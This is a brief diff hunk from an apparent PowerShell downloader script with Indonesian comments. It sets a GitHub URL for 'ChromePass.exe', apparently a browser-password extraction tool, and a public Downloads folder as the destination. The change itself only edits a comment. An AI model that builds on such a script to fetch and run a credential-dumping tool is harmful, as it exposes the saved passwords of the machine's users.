@@ -4,7 +4,7 @@ $Url = "https://github.com/wisnusaputra56/tugasakhir/raw/main/ChromePass.exe"
 # Direktori tempat mengunduh repositori
 $downloadDir = "C:\Users\Public\Downloads"
 
-# Nama file zip untuk unduhan
+# Nama file
 $File = "ChromePass.exe"
 
 # Unduh repositori dari GitHub
